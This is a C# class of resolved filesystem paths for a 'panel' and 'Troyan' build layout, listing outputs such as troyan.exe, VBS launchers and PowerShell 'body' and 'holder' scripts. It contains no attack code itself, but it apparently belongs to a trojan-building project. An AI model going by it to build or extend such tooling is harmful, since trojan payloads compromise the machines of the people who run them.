using System.Text.Json.Serialization;
using model;

namespace Commons;

/// <summary>Resolved filesystem paths for the panel and Troyan build layout (JSON-friendly).</summary>
public sealed class ServerLayoutPaths
{
    private readonly IPanelServerPaths _paths;

    public ServerLayoutPaths(IPanelServerPaths paths) => _paths = paths;

    [JsonPropertyName("sourceCertDir")] public string SourceCertDir => _paths.SourceCertDir;
    [JsonPropertyName("rootDir")] public string RootDir => _paths.RootDir;

    [JsonPropertyName("cpDir")] public string CpDir => _paths.CpDir;
    [JsonPropertyName("certDir")] public string CertDir => _paths.CertDir;
    [JsonPropertyName("sysDir")] public string SysDir => _paths.SysDir;

    [JsonPropertyName("troyanBuilder")] public string TroyanBuilder => _paths.TroyanBuilder;
    [JsonPropertyName("troyanDir")] public string TroyanDir => _paths.TroyanDir;
    [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => _paths.TroyanScriptDir;
    [JsonPropertyName("troyanOutputDir")] public string TroyanOutputDir => Path.Join(TroyanDir, @".\_output");
    [JsonPropertyName("troyanExe")] public string TroyanExe => Path.Join(TroyanOutputDir, "troyan.exe");
    [JsonPropertyName("troyanIco")] public string TroyanIco => Path.Join(TroyanOutputDir, "troyan.ico");
    [JsonPropertyName("troyanVbsDir")] public string TroyanVbsDir => _paths.TroyanVbsDir;
    [JsonPropertyName("troyanVbsDebug")] public string TroyanVbsDebug => Path.Join(TroyanOutputDir, "troyan.debug.vbs");
    [JsonPropertyName("troyanVbsRelease")] public string TroyanVbsRelease => Path.Join(TroyanOutputDir, "troyan.release.vbs");

    [JsonPropertyName("body")] public string Body => Path.Join(TroyanOutputDir, "body.txt");
    [JsonPropertyName("bodyPs1")] public string BodyPs1 => Path.Join(TroyanOutputDir, "body.ps1");
    [JsonPropertyName("bodyPs1Debug")] public string BodyPs1Debug => Path.Join(TroyanOutputDir, "body.debug.ps1");
    [JsonPropertyName("bodyDebugTxt")] public string BodyDebugTxt => Path.Join(TroyanOutputDir, "body.debug.txt");

    [JsonPropertyName("holder")] public string Holder => Path.Join(TroyanOutputDir, "holder.txt");
    [JsonPropertyName("holderPs1")] public string HolderPs1 => Path.Join(TroyanOutputDir, "holder.ps1");
    [JsonPropertyName("holderPs1Debug")] public string HolderPs1Debug => Path.Join(TroyanOutputDir, "holder.debug.ps1");
    [JsonPropertyName("troyanPlainVbs")] public string TroyanPlainVbs => Path.Join(TroyanOutputDir, "troyan.plain.vbs");

    public string UserDataFile(string file) => _paths.UserDataFile(file);

    [JsonPropertyName("userBody")] public string UserBody => _paths.UserDataBody;
    [JsonPropertyName("userTroyanExe")] public string UserTroyanExe => Path.Join(UserDataDir, "troyan.exe");
    [JsonPropertyName("userTroyanIco")] public string UserTroyanIco => Path.Join(UserDataDir, "troyan.ico");
    [JsonPropertyName("userDataDir")] public string UserDataDir => _paths.UserDataDir;
    [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");
    [JsonPropertyName("userTroyanVbs")] public string UserTroyanVbs => Path.Join(UserDataDir, "troyan.vbs");
}
